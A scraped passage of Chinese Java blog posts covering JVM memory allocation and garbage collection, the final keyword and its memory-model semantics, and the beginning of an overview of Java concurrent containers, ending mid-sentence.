对象的内存分配，往大方向上讲，就是在堆上分配（但也可能经过JIT编译后被拆散为标量类型并间接地在栈上分配）。 对象主要分配在新生代的Eden区，如果启动了本地线程分配缓冲，将按线程优先在TLAB上分配。少数情况下也可能直接分配在老年代中，分配的规则并不是百分之百固定的，其细节取决于当前使用的是哪一种垃圾收集器组合，还有虚拟机中与内存相关的参数的设置。 对象优先在Eden区中分配大多数情况下，对象在新生代Eden区中分配。当Eden区没有足够空间进行分配时，虚拟机将发起一次Minor GC。 新生代GC（Minor GC）：指发生在新生代的垃圾收集动作，因为Java对象大多都具备朝生夕灭的特性，所以Minor GC非常频繁，一般回收速度也比较快。 老年代GC（Major GC/Full GC）：指发生在老年代的GC，出现了Major GC，经常会伴随至少一次的Minor GC（但非绝对的，在Parallel Scavenge收集器的收集策略里就有直接进行Major GC的策略选择过程）。Major GC的速度一般会比Minor GC慢10倍以上。 分析 虚拟机提供了-XX : PrintGCDetails这个收集器日志参数，告诉虚拟机在发生垃圾收集行为时打印内存回收日志，并且在进程退出的时候输出当前的内存各区域分配情况。在实际应用中，内存回收日志一般是打印到文件后通过日志工具进行分析。 123456789101112private static final int _1MB = 1024 * 1024;/** * VM参数：-verbose:gc -Xms20M -Xmx20M -Xmn10M -XX:+PrintGCDetails -XX:SurvivorRatio=8 */public static void testAllocation() &#123; byte[] allocation1, allocation2, allocation3, allocation4; allocation1 = new byte[2 * _1MB]; allocation2 = new byte[2 * _1MB]; allocation3 = new byte[2 * _1MB]; allocation4 = new byte[4 * _1MB]; // 出现一次Minor GC &#125; 运行结果： 上面代码的testAllocation()方法中，尝试分配3个2MB大小和1个4MB大小的对象，在运行时通过-XMs20M、-XMx20M、-Xmn10M这3个参数限制了Java堆大小为20MB，不可扩展，其中10MB分配给新生代，剩下的10MB分配给老年代。-XX : SurvivorRatio=9决定了新生代中Eden区与一个Survivor区的空间比例是8:1，从输出的结果也可以清晰的看到“eden space 8192K、from space 1024K、to space 1024K”的信息，新生代总可用空间为9216KB（Eden区+1个Survivor区的总容量）。 执行testAllocation()中分配allocation4对象的语句时会发生一次Minor GC，这次GC的结果是新生代6651KB变为148KB，而总内存占用量则几乎没有减少（因为allocation1、allocation2、allocation3三个对象都是存活的，虚拟机几乎没有找到可回收的对象）。这次GC发生的原因是给allocation4分配内存的时候i，发现Eden已经被占用了6MV，剩余空间已不足以分配allocation4所需的4MB内存，因此发生Minor GC。GC期间虚拟机又发现已有的3个2MB大小的对象全部无法放入Survivor空间（Survivor空间只有1MB大小），所以只好通过分配担保机制提前转移到老年代去。 这次GC结束后，4MB的allocation4对象顺利分配在Eden中，因此程序执行完的结果是Eden占用4MB（被allocation4占用），Survivor空闲，老年代被占用（被allocation1、allocation2、allocation3占用）。通过GC日志可以证实这一点。 大对象直接进入老年代所谓“大对象”就是指一个需要占用大量连续存储空间的对象，最典型的大对象就是那种很长的字符串以及数组。大对象对虚拟机的内存分配来说是一个坏消息，更坏的消息则是遇到一群“朝生夕死”的“短命大对象”，写程序的时候应当避免。经常出现大对象容易导致内存还有不少空间时就提前触发垃圾收集以获取足够的连续空间来“安置”它们。 当发现一个大对象在Eden区+Survior1区中存不下的时候就需要分配担保机制把当前Eden区+Survior1区的所有对象都复制到老年代中区。 我们知道，一个大对象能够存入Eden区+Survior1区中的概率比较小，发生分配担保机制的概率比较大，而分配担保需要涉及到大量的复制，就会造成效率低下。 因此，对于大对象我们直接把他放到老年代中去，从而就能避免大量的复制操作。 生命周期较长的对象进入老年代老年代用于存储生命周期较长的对象，那么如何判断一个对象的年龄呢？ 新生代中每个对象都有一个年龄计数器，如果对象在Eden出生并经过第一次Minor GC后仍然存活并且能被Survior容纳的话，将被移动到Survior空间中，并且对象年龄设为1。对象在Survior区中每“熬过”一次MinorGC，年龄就增加1岁。当它的年龄增加到一定程度（默认为15岁），将会被晋升到老年代中。 使用-XXMaxTenuringThreshold设置新生代的最大年龄。设置该参数后，只要超过该参数的新生代对象都会被转移到老年代中去。 动态对象年龄判定为了能更好地适应不同程序的内存状况，虚拟机并不是永远地要求对象的年龄必须达到MaxTenuringThreshold才能晋升老年代。如果在Survior空间中相同年龄所有对象大小的总和大于Survior空间的一半，年龄大于或等于该年龄的对象就可以直接进入老年代，无须等到MaxTenuringThreshold中要求的年龄。 分配担保策略在发生MinorGC之前，虚拟机会先检查老年代最大可用的连续空间是否大于新生代所有对象空间。如果这个条件成立，那么minor GC可以确保是安全的。 如果上述条件不成立，则虚拟机会查看HandlePromotionFailure设置值是否允许担保失败。如果允许，那么会继续检查老年代最大可用的连续空间是否大于历次晋升到老年代对象的平均大小，如果大于，将尝试着进行一次MinorGC，尽管这次MinorGC是有风险的；如果小于或者HandlePromotionFailure设置不允许冒险，那这时要更改为一次Full GC。通过清除老年代中废弃数据来扩大老年代空闲空间，以便给新生代作担保。 这个过程就是分配担保。那么冒险是冒了什么风险？ 前面提到过，新生代使用复制收集算法，但为了内存利用率，只使用其中一个Survior空间来作为轮换备份。因此当出现大量对象在MinorGC后仍然存活的情况(最极端的情况就是内存回收后新生代中所有对象都存活)，就需要老年代进行分配担保，把Survior无法容纳的对象直接进入老年代。 而老年代要进行这样的担保，前提是老年代本身还有容纳这些对象的剩余空间，一共有多少对象会活下来在实际完成内存回收之前是无法明确知道的，所以只好取之前每一次回收晋升到老年代对象容量的平均大小值作为经验值，与老年代的剩余空间进行比较，决定是否进行Full GC来让老年代腾出更多空间。 取平均值进行比较其实仍然是一种动态概率的手段。也就是说，如果某次MinorGC存活后的对象突增，远远高于平均值的话，依然会导致担保失败(HandlePromotion Failure)。如果出现了担保失败，那就只好在失败后重新发起一次Full GC。虽然担保失败时绕的圈子是最大的，但大部分情况下都还是会将HandlePromotionFailure开关打开，避免Full GC过于频繁。 这个规则在JDK6 Update24之后变为只要老年代的连续空间大于新生代对象总大小或者历次晋升的平均大小就会进行MinorGC，否则将进行Full GC。 Reference 《深入理解Java虚拟机》 图解Java 垃圾回收机制 - https://blog.csdn.net/justloveyou_/article/details/71216049 Very Heavy ! Java虚拟机的垃圾回收处理与垃圾收集算法 - https://blog.csdn.net/J080624/article/details/82148362 深入解析Java垃圾回收机制 - https://www.jianshu.com/p/ee3e9dff5700","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】Java关键字-final关键字","date":"2019-03-19T13:26:12.000Z","path":"2019/03/19/【Java】Java关键字-final关键字/","text":"final的简介final可以修饰变量，方法和类，用于表示所修饰的内容一旦赋值之后就不会再被改变，比如String类就是一个final类型的类。 final的具体使用场景final能够修饰变量，方法和类，也就是final使用范围基本涵盖了Java每个地方，下面就分别以锁修饰的位置：变量，方法和类分别来说一说。 final修饰【变量】在Java中变量，可以分为成员变量以及方法局部变量。因此也是按照这种方式依次来说，以避免漏掉任何一个死角。 final修饰【成员变量】对于一个final变量： 如果是基本数据类型的变量，则其数值一旦在初始化之后便不能更改； 如果是引用类型的变量，则在对其初始化之后，便不能再让其指向另一个对象。 通常每个类中的成员变量可以分为类变量（static修饰的变量）以及实例变量。针对这两种类型的变量赋初值的时机是不同的： 类变量可以在声明变量的时候直接赋初值，或者在静态代码块中给类变量赋初值。 而实例变量可以在声明变量的时候给实例变量赋初值，或者在非静态初始化块中赋初值，或者也可以在构造器中赋初值。 类变量有两个时机赋初值，而实例变量则可以有三个时机赋初值。 当final变量未初始化时，系统不会进行隐式初始化，会出现报错。这样说起来还是比较抽象，下面用具体的代码来演示。 代码涵盖了final修饰变量所有的可能情况。 123456789101112131415161718192021222324252627282930public class Test &#123; // final 实例变量可以在声明时被赋值 private final int a = 6; private final int b; private final int c; private final int d; private final static int e; // final 类变量可以在声明时就被赋值 private final static int f = 1; &#123; // final 实例变量可以在初始化块中赋值 b = 1; &#125; static &#123; // final 类变量可以在静态初始化块中被赋值 e = 1; // final 实例变量不能在静态初始化块中被赋值 b = 2; &#125; public Test() &#123; // final 实例变量可以在构造函数中被赋值 c = 1; // 在任何位置都不能对已经赋值过的final变量再次赋值 b = 3; &#125;&#125; 总结 对于final修饰的类变量：必须要在声明该类变量时，或静态初始化块中，指定初始值，而且只能在这两个地方中其中一个地方进行指定。 对于final修饰的实例变量：必要要在声明该实例变量，或非静态初始化块，或构造器中，指定初始值，而且只能在这三个地方任何一个地方进行指定。 不能在实例方法中为final变量赋值。 不能对已经赋值过的final变量再次赋值。 final修饰【局部变量】final修饰的局部变量必须由程序员进行显式的初始化。 如果final变量未进行初始化，必须进行赋值，而且当且仅有一次赋值机会，这意味着，如果final局部变量已经进行了初始化，则就不能再次进行赋值（修改），否则会提示编译错误， 下面用具体的代码演示final局部变量的情况： 123456public void method1() &#123; final int a; a = 1; // 由于上面已经进行了一个赋值，因此这里的赋值操作会提示报错！ a = 2;&#125; final修饰【方法参数】当一个方法的形参被final修饰的时候，这个参数在该方法内不可以被修改。 123456789public class FinalParam &#123; public void test(final int a )&#123; //a = 10; 值不可以被修改 &#125; public void test(final Person p)&#123; //p = new Person(\"zhangbingxiao\"); 引用本身不可以被修改 p.setName(\"zhangbingxiao\"); //引用所指向的对象可以被修改 &#125;&#125; 对于引用数据类型的修改规则同final属性一样。 final修饰参数在内部类中是非常有用的，在匿名内部类中，为了保持参数的一致性，若所在的方法的形参需要被内部类里面使用时，该形参必须为final。 修饰不同的数据类型final修饰的是基本数据类型和引用类型有区别吗？ 通过上面的例子我们已经看出来，如果final修饰的是一个基本数据类型的数据，一旦赋值后就不能再次更改。 那么，如果final是引用数据类型了？这个引用对象中的字段能够改变吗？我们同样来看一段代码。 12345678910111213141516171819202122232425262728public class Test &#123; public static void main(String[] args) &#123; //在声明final实例成员变量时进行赋值 final Person person = new Person(24, 170); //对final修饰的引用数据类型person中的字段进行更改 person.age = 22; // 输出了 Person&#123;age=22, height=170&#125; System.out.println(person.toString()); &#125;&#125;class Person &#123; public int age; public int height; public Person(int age, int height) &#123; this.age = age; this.height = height; &#125; @Override public String toString() &#123; return \"Person&#123;\" + \"age=\" + age + \", height=\" + height + '&#125;'; &#125;&#125; 通过这个实验，我们就可以看出来： 当final修饰基本数据类型变量时，不能对基本数据类型变量重新赋值，因此这个基本数据类型变量的值不能被改变。 而对于引用类型变量而言，它仅仅保存的是一个引用，final只保证这个引用类型变量所引用的地址不会发生改变，即一直引用这个对象，但这个对象中的属性是可以（多次）修改的。 宏变量由于被final修饰后带来的不可更改性，被final修饰的变量，就可能成为一个“宏变量”，即是一个常量。 所谓”可能”，是指，如果在编译期间能知道它的确切值，则编译器会把它当做编译期常量使用。也就是说在用到该final变量的地方，相当于直接访问的这个常量，不需要在运行时确定。这种和C语言中的宏替换有点像。 例子我们通过一个例子来看看final变量和普通变量到底有何区别。 1234567891011public class Test &#123; public static void main(String[] args) &#123; String a = \"hello2\"; final String b = \"hello\"; String d = \"hello\"; String c = b + 2; String e = d + 2; System.out.println((a == c)); System.out.println((a == e)); &#125;&#125; 结果12truefalse 分析这里面就是final变量和普通变量的区别了，当final变量是基本数据类型以及String类型时，如果在编译期间能知道它的确切值，则编译器会把它当做编译期常量使用。 也就是说在用到该final变量的地方，相当于直接访问的这个常量，不需要直到运行时才确定。这种和C语言中的宏替换有点像。 在上面的一段代码中，由于变量b被final修饰，因此会被当做编译器常量，所以在使用到b的地方会直接将变量b 替换为它的 值。而对于变量d的访问却需要在运行时（runtime）通过链接来进行。 不过要注意，只有在编译期间能确切知道final变量值的情况下，编译器才会进行这样的优化，比如下面的这段代码就不会进行优化： 12345678910111213public class Test &#123; public static void main(String[] args) &#123; String a = \"hello2\"; final String b = getHello(); String c = b + 2; System.out.println((a == c)); &#125; public static String getHello() &#123; return \"hello\"; &#125;&#125; 这段代码的输出结果为false。 final变量命名规范按照Java代码惯例，final变量就是常量，而且通常常量名要大写： 1private final int COUNT = 10; Final修饰【方法】不能重写（overwrite） final方法当父类的方法被final修饰的时候，子类不能重写（overwrite）父类的该final方法。 使用final修饰方法的目的在于把方法的实现锁定，以防止任何继承该类的类修改这个方法的实现。 比如在Object中，getClass()方法就是final的，我们就不能在其任何子类中重写该方法，但是hashCode()方法就不是被final所修饰的，我们就可以重写hashCode()方法。 注：类的private方法会隐式地被指定为final方法。 例子我们还是来写一个例子来加深一下理解： 先定义一个父类，里面有一个final修饰的方法test()。 1234public class FinalExampleParent &#123; public final void test() &#123; &#125;&#125; 然后FinalExample继承该父类，当重写test()方法时报错，如下图： 通过这个现象我们就可以看出来被final修饰的方法不能够被子类所重写（overwrite）。 可以重载（overload） final方法 上面的代码没有任何编译错误。 因此，可以得出结论：被final修饰的方法是可以重载（overload）的。 Final修饰【类】当一个类被final修饰时，该类不能被继承。 子类继承往往可以重写父类的方法和改变父类属性，会带来一定的安全隐患。因此，当一个类不希望被继承时，就可以使用final修饰。 例子当一个类继承一个被final修饰的类时，就会报错，如下图： 不变类不变类的意思是创建该类的实例后，该实例变量是不可改变的。 不可变类有很多好处，譬如它们的对象是只读的，可以在多线程环境下安全的共享，不用额外的同步开销等等。 声明一个不可变类，需要满足以下条件： 使用private和final修饰符来修饰该类的所有成员变量 提供带参的构造器用于初始化类的成员变量； 仅为该类的成员变量提供getter方法，不提供setter方法，因为普通方法无法修改fina修饰的成员变量； 在getter方法中，不要直接返回对象本身，而是克隆对象，并返回对象的拷贝； 通过构造器初始化所有成员时，进行深拷贝（deep copy）； 如果有必要就重写Object类 的hashCode()和equals()方法，应该保证用equals()判断相同的两个对象其Hashcode值也是相等的。 例子1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889public final class FinalClassExample &#123; private final int id; private final String name; private final HashMap testMap; public int getId() &#123; return id; &#125; public String getName() &#123; return name; &#125; /** * 可变对象的访问方法 */ public HashMap getTestMap() &#123; //return testMap; return (HashMap) testMap.clone(); &#125; /** * 实现深拷贝(deep copy)的构造器 */ public FinalClassExample(int i, String n, HashMap hm) &#123; System.out.println(\"Performing Deep Copy for Object initialization\"); this.id = i; this.name = n; HashMap tempMap = new HashMap(); String key; Iterator it = hm.keySet().iterator(); while (it.hasNext()) &#123; key = it.next(); tempMap.put(key, hm.get(key)); &#125; this.testMap = tempMap; &#125; /** * 实现浅拷贝(shallow copy)的构造器 */ /** public FinalClassExample(int i, String n, HashMap hm)&#123; System.out.println(\"Performing Shallow Copy for Object initialization\"); this.id=i; this.name=n; this.testMap=hm; &#125; */ /** * 测试浅拷贝的结果 * 为了创建不可变类，要使用深拷贝 * * @param args */ public static void main(String[] args) &#123; HashMap h1 = new HashMap(); h1.put(\"1\", \"first\"); h1.put(\"2\", \"second\"); String s = \"original\"; int i = 10; FinalClassExample ce = new FinalClassExample(i, s, h1); //Lets see whether its copy by field or reference System.out.println(s == ce.getName()); System.out.println(h1 == ce.getTestMap()); //print the ce values System.out.println(\"ce id:\" + ce.getId()); System.out.println(\"ce name:\" + ce.getName()); System.out.println(\"ce testMap:\" + ce.getTestMap()); //change the local variable values i = 20; s = \"modified\"; h1.put(\"3\", \"third\"); //print the values again System.out.println(\"ce id after local variable change:\" + ce.getId()); System.out.println(\"ce name after local variable change:\" + ce.getName()); System.out.println(\"ce testMap after local variable change:\" + ce.getTestMap()); HashMap hmTest = ce.getTestMap(); hmTest.put(\"4\", \"new\"); System.out.println(\"ce testMap after changing variable from accessor methods:\" + ce.getTestMap()); &#125;&#125; 输出12345678910Performing Deep Copy for Object initializationtruefalsece id:10ce name:originalce testMap:&#123;2=second, 1=first&#125;ce id after local variable change:10ce name after local variable change:originalce testMap after local variable change:&#123;2=second, 1=first&#125;ce testMap after changing variable from accessor methods:&#123;2=second, 1=first&#125; 现在我们注释掉深拷贝的构造器，取消对浅拷贝构造器的注释。也对getTestMap()方法中的返回语句取消注释，返回实际的对象引用。然后再一次执行代码。 12345678910Performing Shallow Copy for Object initializationtruetruece id:10ce name:originalce testMap:&#123;2=second, 1=first&#125;ce id after local variable change:10ce name after local variable change:originalce testMap after local variable change:&#123;3=third, 2=second, 1=first&#125;ce testMap after changing variable from accessor methods:&#123;3=third, 2=second, 1=first, 4=new&#125; 从输出可以看出，HashMap的值被更改了，因为构造器实现的是浅拷贝，而且在getter方法中返回的是原本对象的引用。 JDK中提供的八个包装类和String类都是不可变类，我们来看看String的实现。 12345678910111213141516171819202122public final class String implements java.io.Serializable, Comparable&lt;String&gt;, CharSequence &#123; /** The value is used for character storage. */ private final char value[]; /** Cache the hash code for the string */ private int hash; // Default to 0 /** use serialVersionUID from JDK 1.0.2 for interoperability */ private static final long serialVersionUID = -6849794470754667710L; /** * Class String is special cased within the Serialization Stream Protocol. * * A String instance is written into an ObjectOutputStream according to * &lt;a href=\"&#123;@docRoot&#125;/../platform/serialization/spec/output.html\"&gt; * Object Serialization Specification, Section 6.2, \"Stream Elements\"&lt;/a&gt; */ private static final ObjectStreamField[] serialPersistentFields = new ObjectStreamField[0]; ...&#125; 可以看出String的value就是final修饰的，上述其他几条性质也是吻合的。 多线程中final变量的可见性（visibility）问题背景在Java内存模型中，我们知道Java内存模型为了能让处理器和编译器底层发挥他们的最大优势，对底层的约束就很少。 也就是说针对底层来说，Java内存模型就是一弱内存数据模型。同时，处理器和编译为了性能优化会对指令序列有编译器和处理器重排序。 那么，在多线程情况下，final会进行怎样的重排序（reordering）？会导致线程安全的问题吗？ 下面，就来看看final域的可见性（visibility）问题。可见性（visibility）问题是指，当一个线程修改了一个变量的值后，另一个线程是否能够感知到这个修改。 final域为基本类型例子先看一段示例性的代码： 12345678910111213141516171819202122public class FinalDemo &#123; private int a; //普通域 private final int b; //final域 private static volatile FinalDemo finalDemo; public FinalDemo() &#123; a = 1; // 1. 写普通域 b = 2; // 2. 写final域 &#125; public static void writer() &#123; finalDemo = new FinalDemo(); &#125; public static void reader() &#123; if (finalDemo != null)&#123; FinalDemo demo = finalDemo; // 3.读对象引用 int a = demo.a; //4.读普通域 int b = demo.b; //5.读final域 &#125; &#125;&#125; 假设线程A已经执行完writer()方法后，线程B才开始执行reader()方法。 注意，这里我们假设”线程A先执行writer()方法，在线程A执行完之后，线程B开始执行reader()方法”，而（在实践中）如果只是将这两个方法分别传入两个Thread对象，这两个线程的先后执行顺序是完全未知的。 因此，在进行以下讨论时，我们暂且认为假设的执行顺序已经得到了保障。 规则禁止将final域的写操作，重排序到构造函数之外。这个规则的实现主要包含了两个方面： JMM禁止编译器把final域的写操作重排序到构造函数之外； 编译器会在final域的写操作之后，构造函数return之前，插入一个storestore屏障。这个屏障可以禁止处理器把final域的写操作，重排序到构造函数之外。 例子分析由于a，b之间没有数据依赖性，普通域（普通变量）a可能会被重排序到构造函数之外，线程B就有可能读到普通变量a初始化之前的值（零值），这样就可能出现错误。而对于final域变量b，根据重排序规则，会禁止final修饰的变量b重排序到构造函数之外（意味着变量b能够在FinalDemo对象实例的构造函数执行完成前被赋值），因而线程B就能够读到final变量初始化后的值。 因此，final域写操作的重排序规则可以确保：在对象引用为任意线程可见之前，对象的final域已经被正确初始化过了，而普通域就不具有这个保障。 final域为引用类型针对类型为引用数据类型的final域的写操作，针对编译器和处理器重排序增加了这样的约束：在构造函数内，对一个final修饰的成员域的写入，与随后在构造函数之外把这个被构造的对象的引用赋给一个引用变量，这两个操作是不能被重排序的。 注意这里的约束是被“增加”的，也就说，前面对final基本数据类型的重排序规则在这里还是适用。这句话是比较拗口的，下面结合实例来看。 例子12345678910111213141516171819202122232425public class FinalReferenceDemo &#123; final int[] arrays; public FinalReferenceDemo() &#123; arrays = new int[1]; //语句1 arrays[0] = 1; //语句2 &#125;&#125;public class Demo&#123; private volatile FinalReferenceDemo finalReferenceDemo; public void writerOne() &#123; finalReferenceDemo = new FinalReferenceDemo(); //语句3 &#125; public void writerTwo() &#123; this.finalReferenceDemo.arrays[0] = 2; //语句4 &#125; public void reader() &#123; if (this.finalReferenceDemo != null) &#123; //语句5 int temp = finalReferenceDemo.arrays[0]; //语句6 &#125; &#125;&#125; 假设线程A先执行wirterOne()方法；线程A执行完后，线程B执行writerTwo()方法，然后线程C执行reader()方法。 注意，这里我们的假设”线程A先执行wirterOne()方法；线程A执行完后，线程B执行writerTwo()方法，然后线程C执行reader()方法”是讨论这个问题的前提。 而事实上，在上面的代码中，并没有任何机制保障这个假设。因而，在进行以下讨论时，我们暂且认为假设的执行顺序已经得到了保障。 分析由于，对于final域的写操作，会被禁止重排序到这个域对应类的构造方法之后，因此，线程A在执行完语句3后（语句3中包括了语句1和语句2），语句1和语句2的执行对所有线程均可见。 但是，对于线程B中执行的语句4，JMM不保证其可见性。也就是说，线程C的temp变量可能为2，也可能为1。 final的实现原理上面我们提到过，对于对final域的写操作，重排序规则会要求编译器在进行对final域的写操作之后，构造函数返回前插入一个Store屏障，以保证对final域的写操作（对其他线程）的可见性。 类似地，对final域的读操作，重排序规则也会要求编译器在对final域的读操作前插入一个Load屏障。 为什么final引用不能从构造函数中“溢出”这里还有一个比较有意思的问题：上面对final域写重排序规则，可以确保我们在使用一个对象引用的时候，该对象的final域已经在构造函数中被初始化过了。但是这里其实是有一个前提条件的，也就是：在构造函数，不能让这个被构造的对象被其他线程可见，也就是说该对象引用不能在构造函数中“逸出”。以下面的例子来说： 12345678910111213141516171819public class FinalReferenceEscapeDemo &#123; private final int a; private FinalReferenceEscapeDemo referenceDemo; public FinalReferenceEscapeDemo() &#123; a = 1; //语句1 referenceDemo = this; //语句2 &#125; public void writer() &#123; this.referenceDemo = new FinalReferenceEscapeDemo(); &#125; public void reader() &#123; if (this.referenceDemo != null) &#123; //语句3 int temp = this.referenceDemo.a; //语句4 &#125; &#125;&#125; 假设一个线程A先执行writer()方法，在线程A执行完成后，线程B开始执行reader()方法。 因为构造函数中操作语句1和语句2之间没有数据依赖性，因此，语句1和语句2可以被重排序。 如果先执行了语句2（而还未执行语句1），这个时候引用变量referenceDemo不为null，但是a的值仍为0。 因此，在线程B中，语句3中的if条件能够被满足。但是获取到的temp变量却为0。 总结，引用对象“this”逸出，该代码依然存在线程安全的问题。 Reference 《The Art of Java Concurrency Programming》 你以为你真的了解final吗？ - https://juejin.im/post/5ae9b82c6fb9a07ac3634941 浅析Java中的final关键字 - https://www.cnblogs.com/dolphin0520/p/3736238.html 如何写一个不可变类？ - http://www.importnew.com/7535.html 重新认识 java（七） - final 关键字 - https://juejin.im/entry/58affd238d6d810058554a5c","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】集合类 - 并发容器(Concurrent Container)","date":"2019-03-18T08:30:51.000Z","path":"2019/03/18/【Java】集合类-并发容器/","text":"背景 java.util.concurrent包下面为我们提供了丰富的类和接口供我们开发出支持高并发、线程安全的程序。 同步容器类：Vector，HashTable和Collections.SynchronizedXXX() 并发容器类：包括ConcurrentHashMap，CopyOnWrite容器以及阻塞队列。 同步容器类同步容器类包括：Vector和HashTable，这两个类是早期JDK的一部分。此外还包括了JDK1.2之后提供的同步封装器方法Collections.synchronizedXxx()。 同步容器类的问题我们都知道Vector是线程安全的容器，但当我们对Vector进行多线程操作时，可能会得到意想之外的结果。 比如迭代操作： 123for(int i=0;i&lt;vector.size();i++)&#123; doSomething(vector.get(i));&#125; 例如两个线程A和B，A线程对容器进行迭代操作的时候，B线程可能对容器进行了删除操作，这样就会导致A线程的迭代操作抛出IndexOutOfBoundsException。而这显然不是我们想得到的结果。 所以，为了解决不可靠迭代的问题，我们只能牺牲伸缩性为容器加锁，代码如下： 12345synchronized(vector)&#123; for(int i=0;i&lt;vector.size();i++)&#123; doSomething(vector.get(i)); &#125;&#125; 加锁防止了迭代期间对容器的修改，但这同时也降低了容器的并发性。当容器很大时，其他线程要一直等待迭代结束，因此性能不高。 迭代器与CoucurrentModificationException上面的例子我们举了Vector这种“古老”的容器。 但是实际上很多“现代”的容器类也并没有避免上面所提到的问题。比如：for-each循环和Iterator。 当我们调用Iterator类的hasNext和next方法对容器进行迭代时，若其他线程并发修改该容器，那么此时容器表现出的行为是“及时失败”的，即抛出CoucurrentModificationException。 因此，为了避免以上问题，我们又不得不为容器加锁，或者对容器进行“克隆”，在副本上进行操作，但这样做的性能显然是不高的。 隐藏的迭代器这里要特别提到的是有些类的方法会隐藏的调用容器的迭代器，这往往是很容易被我们忽视的。看下面列子： 123456789private final Set&lt;Integer&gt; set = new HashSet&lt;Integer&gt;();public synchronized void add(Integer i)&#123;set.add(i);&#125;public void addMore()&#123; for(int i=0;i&lt;10;i++) add(i); System.out.println(\"this is set:\"+set);&#125; 以上代码能看出对容器的迭代操作吗？乍看没有。 但实际上最后一段“this is set：”+set的代码影藏的调用了set的toString方法，而toString方法又会影藏的调用容器的迭代方法，这样该类的addMore方法同样可能会抛出CoucurrentModificationException异常。 更严重的问题是该类并不是线程安全的，我们可以使用SynchronizedSet来包装set类，对同步代码进行封装，这样就避免了问题。此外我们还需要特别注意：容器的equals、hashCode方法都会隐式的进行迭代操作，当一个容器作为另一个容器的健值或者元素时就会出现这种情况。同样，containsAll，removeAll等方法以及把容器当做参数的构造函数，都会进行迭代操作。所有这些间接迭代的操作都可能导致程序抛出CoucurrentModificationException。 并发容器（Concurrent Container）针对于同步容器的巨大缺陷，java.util.concurrent中提供了并发容器。并发容器包注重以下特性： 根据具体场景进行设计，尽量避免使用锁，提高容器的并发访问性。 并发容器定义了一些线程安全的复合操作。 并发容器在迭代时，可以不封闭在synchronized中。但是未必每次看到的都是”最新的、当前的”数据。如果说将迭代操作包装在synchronized中，可以达到”串行”的并发安全性，那么并发容器的迭代达到了”脏读”。 List接口和Set接口CopyOnWriteArrayList和CopyOnWriteArraySetCopyOnWriteArrayList和CopyOnWriteArraySet分别代替ArrayList和HashSet，主要是在遍历操作为主的情况下来代替同步的List和同步的Set。 实现并发主要可以通过两种方法： 加锁 “克隆”容器对象 CopyOnWriteArrayListCopyOnWrite容器用于替代同步的List，它提供了更好的并发性，并且在使用时不需要加锁或者拷贝容器。 CopyOnWriteArrayList的主要应用就是迭代容器操作多而修改少的场景，迭代时也不会抛出CoucurrentModificationException异常。 CopyOnWrite容器的底层实现是在迭代操作前都会复制一个底层数组，这保证了多线程下的并发性和一致性，但是当底层数组的数据量比较大的时候，就需要效率问题了。 CopyOnWriteArraySet基于CopyOnWriteArrayList实现，其唯一的不同是在add时调用的是CopyOnWriteArrayList的addIfAbsent方法，其遍历当前Object数组，如Object数组中已有了当前元素，则直接返回，如果没有则放入Object数组的尾部，并返回。 ConcurrentSkipListSet目标：代替TreeSet。 原理：内部基于ConcurrentSkipListMap实现。 Skip list（跳表）是一种可以代替平衡树的数据结构，默认是按照Key值升序的。 Query接口Java 5.0之后新增加了Queue（队列）和BlockingQueue（阻塞队列）。 队列分为有界队列和无界队列。无界队列会因为数据的累计造成内存溢出，使用时要小心。 BlockingQueue接口（阻塞队列）BlockingQueue扩展了Queue，增加了可阻塞的插入和获取操作，如果队列为空，那么获取操作将阻塞，直到队列中有一个可用的元素。如果队列已满，那么插入操作就阻塞，直到队列中出现可用的空间。 阻塞队列有很多种实现，最常用的有ArrayBlockingQueue和LinkedBlockingQueue。阻塞队列提供了阻塞的take和put方法，如果队列已满，那么put方法将等待队列有空间时在执行插入操作；如果队列为空，那么take方法将一直阻塞直到有元素可取。有界队列是一个强大的资源管理器，它能抑制产生过多的工作项，使程序更加健壮。 原理通过ReentrantLock实现线程安全，通过Condition实现阻塞和唤醒 实现类 LinkedBlockingQueue：基于链表实现的可阻塞的FIFO队列 ArrayBlockingQueue：基于数组实现的可阻塞的FIFO队列 PriorityBlockingQueue：按优先级排序的队列，一个可以按照优先级排序的阻塞队列，当你希望按照某种顺序来排序时非常有用。 DelayQueue：无界阻塞队列，只有在延迟期满时才能从中提取元素。 ArrayBlockingQueue类一个由数组支持的有界阻塞队列。ArrayBlockingQueue是一个典型的”有界缓存区”，由于数组大小固定，所以一旦创建了这样的“缓存区”，就不能再增加其容量。 阻塞条件：试图向已满队列中执行put元素会导致操作受阻塞；试图从空队列中take元素将导致类似阻塞。 ##### 非阻塞队列ConcurrentLinkedQuerue原理：基于链表实现的非阻塞的FIFO队列（LinkedList的并发版本） ConcurrentLinkedQueue是使用非阻塞的方式实现的基于链接节点的无界的线程安全队列，性能非常好。 多个线程共享访问一个公共 collection 时，ConcurrentLinkedQueue 是一个恰当的选择。此队列不允许使用 null 元素。 ConcurrentLinkedQuerue是Query实现，是一个先进先出的队列。一般的Queue实现中操作不会阻塞，如果队列为空，那么取元素的操作将返回空。Queue一般用LinkedList实现的，因为去掉了List的随机访问需求，因此并发性更好。 Deque接口（双端队列）Deque是一种双端队列，它支持在两端进行插入和删除元素，Deque继承自Queue。 BlockingDeque就是支持阻塞的双端队列，常用的实现有LinkedBlockingDeque。双端队列最典型的应用是工作密取，每个消费者都有各自的双端队列，它适用于既是生产者又是消费者的场景。 Map接口ConcurrentHashMapJava 5.0增加的ConcurrentHashMap几乎是最常用的并发容器了。 与HashTable相比，ConcurrentHashMap不仅线程安全，而且还支持高并发、高吞吐。 ConcurrentHashMap的底层实现使用了分段锁技术，而不是独占锁，它允许多个线程可以同时访问和修改容器，而不会抛出CoucurrentModificationException异常，极大地提高了效率。 在这里要说明的是ConcurrentHashMap返回的迭代器是弱一致性的，而不是及时失败的。另外size、isEmpty等需要在整个容器上执行的方法其返回值也是弱一致性的，是近似值而非准确值。所以，在实际使用中要对此做权衡。与同步容器和加锁机制相比，ConcurrentHashMap优势明显，是我们优先考虑的容器。 ConcurrentSkipListMap 对应的非并发容器：TreeMap 目标：代替synchronizedSortedMap(TreeMap) 原理：Skip 